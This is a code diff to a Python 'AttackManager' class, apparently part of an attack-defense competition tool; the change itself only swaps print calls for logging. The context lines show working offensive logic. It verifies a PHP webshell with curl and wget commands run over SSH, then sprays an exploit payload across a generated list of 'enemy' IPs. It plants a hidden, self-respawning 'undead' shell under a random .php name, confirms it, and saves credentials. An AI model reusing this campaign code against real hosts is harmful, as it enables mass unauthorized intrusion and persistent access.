@@ -7,7 +7,10 @@ import requests
 import base64
 import random
 import string
+import logging
 from urllib.parse import quote
+
+logger = logging.getLogger('AttackManager')
 
 class AttackManager:
     def __init__(self, connection_manager, target_manager):
@@ -33,20 +36,20 @@ class AttackManager:
             try:
                 with open(self.config_file, 'r') as f:
                     self.enemy_config = json.load(f)
-                print(f"DEBUG: Loaded attack config from {self.config_file} with {len(self.enemy_config.get('targets', {}))} targets")
+                logger.debug(f"Loaded attack config from {self.config_file} with {len(self.enemy_config.get('targets', {}))} targets")
             except Exception as e:
-                print(f"ERROR: Failed to load attack config: {e}")
+                logger.error(f"Failed to load attack config: {e}")
 
     def save_config(self):
         if self.config_file:
             try:
                 with open(self.config_file, 'w') as f:
                     json.dump(self.enemy_config, f, indent=4)
-                print(f"DEBUG: Saved attack config to {self.config_file}")
+                logger.debug(f"Saved attack config to {self.config_file}")
             except Exception as e:
-                print(f"ERROR: Failed to save attack config: {e}")
+                logger.error(f"Failed to save attack config: {e}")
         else:
-            print("ERROR: config_file is None, cannot save attack config")
+            logger.error("config_file is None, cannot save attack config")
 
     def set_enemy_config(self, template, excluded_ips_str):
         self.enemy_config['network_template'] = template
@@ -86,7 +89,7 @@ while (1) {{
         shell_path: 可能是绝对路径 /var/www/html/shell.php
         return: valid_url_path (e.g., /shell.php) or None
         """
-        print(f"DEBUG: Verifying locally {local_ip}:{port} {shell_path} pass={password}")
+        logger.debug(f"Verifying locally {local_ip}:{port} {shell_path} pass={password}")
         
         # Guess URL paths
         # 1. Full path assumption (if path starts with /var/www/html)
@@ -110,16 +113,16 @@ while (1) {{
                 data = {password: "echo 'VULN_CONFIRMED';"}
                 res = requests.post(url, data=data, timeout=2)
                 if res.status_code == 200 and 'VULN_CONFIRMED' in res.text:
-                    print(f"DEBUG: Verified local exploit via {url}")
+                    logger.debug(f"Verified local exploit via {url}")
                     valid_uri = uri
                     break
             except Exception as e:
-                print(f"DEBUG: Verify failed for {url}: {e}")
+                logger.debug(f"Verify failed for {url}: {e}")
         
         if valid_uri: return valid_uri, port # Return tuple if remote verify succeeded (using passed port)
 
         # 4. Fallback: Verify via SSH (Localhost request)
-        print(f"DEBUG: Remote verify failed. Assessing local verify via SSH (potential_uris={potential_uris})...")
+        logger.debug(f"Remote verify failed. Assessing local verify via SSH (potential_uris={potential_uris})...")
         
         # Try common web ports: 80, 8080. And the connection port just in case.
         # Deduplicate and prioritize 80.
@@ -130,7 +133,7 @@ while (1) {{
         valid_port = None
 
         for p_try in candidate_ports:
-            print(f"DEBUG: Trying local verification on port {p_try}...")
+            logger.debug(f"Trying local verification on port {p_try}...")
             for uri in potential_uris:
                 uri = uri.lstrip('/')
                 payload_key = password
@@ -138,49 +141,49 @@ while (1) {{
                 
                 # --- Method A: curl ---
                 cmd_curl = f"curl -s -d \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
-                print(f"DEBUG: Trying SSH curl: {cmd_curl}")
+                logger.debug(f"Trying SSH curl: {cmd_curl}")
                 
                 try:
                     output = self.cm.execute(local_ip, port, cmd_curl) # Always connect via SSH port
                     if output and 'VULN_CONFIRMED' in output:
-                        print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} curl): {uri}")
+                        logger.debug(f"Verified local exploit via SSH (localhost:{p_try} curl): {uri}")
                         valid_uri = uri
                         valid_port = p_try
                         return valid_uri, valid_port # Return tuple
                     else:
-                        print(f"DEBUG: curl failed, output: {output[:100] if output else 'None'}")
+                        logger.debug(f"curl failed, output: {output[:100] if output else 'None'}")
                         # --- Method B: wget ---
                         cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
-                        print(f"DEBUG: Trying SSH wget: {cmd_wget}")
+                        logger.debug(f"Trying SSH wget: {cmd_wget}")
                         output = self.cm.execute(local_ip, port, cmd_wget)
                         if output and 'VULN_CONFIRMED' in output:
-                            print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} wget): {uri}")
+                            logger.debug(f"Verified local exploit via SSH (localhost:{p_try} wget): {uri}")
                             valid_uri = uri
                             valid_port = p_try
                             return valid_uri, valid_port # Return tuple
                         else:
-                            print(f"DEBUG: wget failed, output: {output[:100] if output else 'None'}")
+                            logger.debug(f"wget failed, output: {output[:100] if output else 'None'}")
 
                 except Exception as e:
-                    print(f"DEBUG: SSH Local Verify error for {uri} on port {p_try}: {e}")
+                    logger.debug(f"SSH Local Verify error for {uri} on port {p_try}: {e}")
 
         return None, None
 
     def start_counter_attack_campaign(self, source_ip, source_port, shell_path, password):
         """启动一波反制攻击"""
         if not self.enemy_config.get('network_template'):
-            print("Attack cancelled: No enemy network template.")
+            logger.warning("Attack cancelled: No enemy network template")
             return
 
         # 1. Verify locally first (and get web port)
         # Fix: Unpack the tuple returned by verify_exploit_locally
         res = self.verify_exploit_locally(source_ip, source_port, shell_path, password)
         if not res or not res[0]:
-            print("Attack cancelled: Could not verify webshell locally.")
+            logger.warning("Attack cancelled: Could not verify webshell locally")
             return
         
         valid_uri, valid_port = res
-        print(f"DEBUG: Local check passed. Target Port={valid_port}, URI={valid_uri}")
+        logger.debug(f"Local check passed. Target Port={valid_port}, URI={valid_uri}")
 
         # 2. Generate Enemy IPs
         enemy_ips = self._generate_enemy_ips(source_ip)
@@ -247,7 +250,7 @@ include($f);
         return ips
 
     def _run_campaign(self, enemy_ips, port, uri, password, exploit_php, shell_filename):
-        print(f"Starting attack campaign against {len(enemy_ips)} targets... (Shell: {shell_filename})")
+        logger.info(f"Starting attack campaign against {len(enemy_ips)} targets... (Shell: {shell_filename})")
         
         for ip in enemy_ips:
             self._attack_one(ip, port, uri, password, exploit_php, shell_filename)
@@ -265,7 +268,7 @@ include($f);
             # Our payload `include($f)` will execute the loop and HANG.
             # So we set a very short timeout and catch ReadTimeout as success?
             
-            print(f"Attacking {url}...")
+            logger.info(f"Attacking {url}...")
             try:
                 requests.post(url, data={password: exploit_php}, timeout=1)
                 # If it returns 200 immediately, maybe it didn't loop? Or it spawned?
@@ -286,9 +289,9 @@ include($f);
             
             # --- New: Print Result to Terminal ---
             if success:
-                print(f"[ATTACK SUCCESS] {ip}:{port} - Payload delivered (timout confirmed).")
+                logger.info(f"[ATTACK SUCCESS] {ip}:{port} - Payload delivered (timeout confirmed)")
             else:
-                print(f"[ATTACK FAILED] {ip}:{port} - {result}")
+                logger.warning(f"[ATTACK FAILED] {ip}:{port} - {result}")
             
             # Verify Implantation?
             # Try to connect to implanted shell: .<random>.php
@@ -314,7 +317,7 @@ include($f);
                         res = requests.get(verify_url, timeout=2)
                         if res.status_code == 200:
                             target_info['status'] = 'confirmed'
-                            print(f"[ATTACK CONFIRMED] {ip}:{port} - Undead shell active at {verify_url}")
+                            logger.info(f"[ATTACK CONFIRMED] {ip}:{port} - Undead shell active at {verify_url}")
                             verified = True
                             break
                     except:
@@ -323,7 +326,7 @@ include($f);
                 if not verified:
                     target_info['status'] = 'uncertain'
                     # Print last tested URL just for info
-                    print(f"[ATTACK UNCERTAIN] {ip}:{port} - Verification failed (404/Timeout). Tested: {verify_uris}")
+                    logger.warning(f"[ATTACK UNCERTAIN] {ip}:{port} - Verification failed (404/Timeout). Tested: {verify_uris}")
             
             # Save credentials if successful or uncertain
             if success:
@@ -347,7 +350,7 @@ include($f);
         except Exception as e:
             target_info['status'] = 'failed'
             target_info['last_msg'] = str(e)
-            print(f"[ATTACK FAILED] {ip}:{port} - Exception: {e}")
+            logger.error(f"[ATTACK FAILED] {ip}:{port} - Exception: {e}")
         
         # CRITICAL FIX: Update the main config dictionary
         # target_info is a reference to the dict inside config if it existed,
